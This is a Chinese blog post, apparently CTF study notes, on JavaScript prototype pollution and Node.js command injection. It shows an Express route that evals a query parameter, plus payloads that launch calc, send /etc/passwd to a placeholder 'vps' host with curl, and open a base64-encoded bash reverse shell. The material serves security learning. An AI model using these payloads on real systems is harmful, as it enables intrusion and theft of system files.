
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>JavaScript原型链污染学习 - hybcx's blog</title>

  
    <meta name="description" content="0x01 前言 最近新生赛老是碰到JavaScript原型链题目，我纳闷儿呢，这玩意儿也算新生难度了？？？┭┮﹏┭┮终究是我太菜了。话不多说，直接开卷！！！以下几乎都是转载的参考文章，请见谅┭┮﹏┭┮ 0x02 危险函数所导致的命令执行 2.1 eval() eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没">
<meta property="og:type" content="article">
<meta property="og:title" content="JavaScript原型链污染学习">
<meta property="og:url" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 前言 最近新生赛老是碰到JavaScript原型链题目，我纳闷儿呢，这玩意儿也算新生难度了？？？┭┮﹏┭┮终究是我太菜了。话不多说，直接开卷！！！以下几乎都是转载的参考文章，请见谅┭┮﹏┭┮ 0x02 危险函数所导致的命令执行 2.1 eval() eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029173231798.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029175445596.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029214147601.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029214539647.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029215044763.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029215113706.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029220340685.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029221210974.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029221236044.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/1697186478753-9e04f15b-e05c-47b3-a548-aab0d5293c30.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029221852070.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/1697188839411-0fa63bd4-e6f0-4470-9039-d8d20b204854.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/1697188879878-5029f76e-32a9-4eea-bb8e-5c57a314457a.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/1697189214644-301a6aad-0d5b-4670-837b-42eb067c77b2.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/1697189450577-1a95a685-c26a-4a85-994e-d563770d3a28.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/1697190336018-c24b4710-ed71-4aa1-b9a7-153bd8246aa7.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/1697190652884-c58859f5-8f50-4ab4-a0e3-465fcc953bf8.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/1697190928756-757169ee-1ff2-4fb2-884c-15232dc0661a.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/1697273666377-179f0753-f392-4490-adda-0cbcd4c8d921.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030190629976.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030190941582.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030191055545.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030193224104.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030193404903.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030201003485.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030201015450.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030201152813.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030201511642.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030201547409.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030201659774.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030201715932.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030202109219.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030204648215.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030205253645.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030205601565.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030210210157.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030210240444.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030210320245.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030210815548.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030210832366.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030210859697.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030211017609.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030211700937.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030211817842.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231030211954466.png">
<meta property="article:published_time" content="2023-10-29T09:24:57.547Z">
<meta property="article:modified_time" content="2023-10-30T13:30:03.385Z">
<meta property="article:author" content="hybcx">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/image-20231029173231798.png">
  
  
  
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <script>
  if (window.localStorage.getItem('ZYI_Theme_Mode')==='dark' || (window.localStorage.getItem('ZYI_Theme_Mode')==='Moss' && window.matchMedia('(prefers-color-scheme: dark)').matches)){
      document.querySelector("html").id = "ZYDark";
  }
</script>
<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/custom/css/ZYDark.css">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/logo.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 奈何却无能</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper slide-up post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">浅析SSTI漏洞</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PIN码学习</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/04/15/uuctf-2022/"><span class="title">UUCTF_2022</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/">常见top漏洞</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-10-29T09:24:57.547Z">2023-10-29</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2023-10-30T13:30:03.385Z">2023-10-30</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>JavaScript原型链污染学习</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content slide-up"><h1 id="0x01-前言">0x01 前言</h1>
<p>最近新生赛老是碰到JavaScript原型链题目，我纳闷儿呢，这玩意儿也算新生难度了？？？┭┮﹏┭┮终究是我太菜了。话不多说，直接开卷！！！以下几乎都是转载的参考文章，请见谅┭┮﹏┭┮</p>
<h1 id="0x02-危险函数所导致的命令执行">0x02 危险函数所导致的命令执行</h1>
<h2 id="21-eval">2.1 eval()</h2>
<p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p>
<p>简单例子：main.js</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">"express"</span>);
<span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/eval'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){
    res.<span class="hljs-title function_">send</span>(<span class="hljs-built_in">eval</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>);
})

<span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8888</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"应用实例，访问地址为 http://127.0.0.1:8888/"</span>);
})</code></pre>
<p><strong>漏洞利用：</strong></p>
<p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require('child_process').exec('');</code>来进行调用。</p>
<p>弹计算器(windows)：</p>
<pre><code class="hljs js">/<span class="hljs-built_in">eval</span>?q=<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'calc'</span>);</code></pre>
<p>读取文件(linux)：</p>
<pre><code class="hljs js">/<span class="hljs-built_in">eval</span>?q=<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'curl -F "x=`cat /etc/passwd`" http://vps'</span>);;</code></pre>
<p>反弹shell(linux)：</p>
<pre><code class="hljs js">/<span class="hljs-built_in">eval</span>?q=<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash'</span>);

<span class="hljs-title class_">YmFzaCAtaSA</span>%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">3333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> <span class="hljs-title class_">BASE64</span>加密后的结果，直接调用会报错。

注意：<span class="hljs-title class_">BASE64</span>加密后的字符中有一个+号需要url编码为%2B(一定情况下)</code></pre>
<p>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load('child_process').exec('calc')</code>来执行命令</p>
<p>paypal一个命令执行的例子：</p>
<p><a target="_blank" rel="noopener" href="https://artsploit.blogspot.com/2016/08/pprce2.html">demo.paypal.com] Node.js code injection (RCE)</a></p>
<p>(使用数组绕过过滤，再调用child_process执行命令)</p>
<h2 id="22-类似命令">2.2 类似命令</h2>
<p>间隔两秒执行函数：</p>
<ul>
<li>setInteval(some_function, 2000)</li>
</ul>
<p>两秒后执行函数：</p>
<ul>
<li>setTimeout(some_function, 2000);</li>
</ul>
<p>some_function处就类似于eval函数的参数</p>
<p>输出HelloWorld：</p>
<ul>
<li>Function(“console.log(‘HelloWolrd’)”)()</li>
</ul>
<p>类似于php中的create_function</p>
<p>以上都可以导致命令执行</p>
<h1 id="0x03-javascript类">0x03 JavaScript类</h1>
<h2 id="31-类的声明">3.1 类的声明</h2>
<p>下面是一个基本的 JavaScript 类的声明</p>
<pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">num</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = num
    }
    <span class="hljs-title function_">applyAdd</span>(<span class="hljs-params">op</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> += op
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
    }
    <span class="hljs-title function_">applySub</span>(<span class="hljs-params">op</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> -= op
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
    }
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">num1, num2</span>) {
        <span class="hljs-keyword">return</span> num1 + num2
    }
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">num1, num2</span>) {
        <span class="hljs-keyword">return</span> num1 - num2
    }
}</code></pre>
<p>然后我们创建类的实例</p>
<pre><code class="hljs javascript"><span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">num</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-title function_">applyAdd</span>(<span class="hljs-number">2</span>).<span class="hljs-property">num</span>)
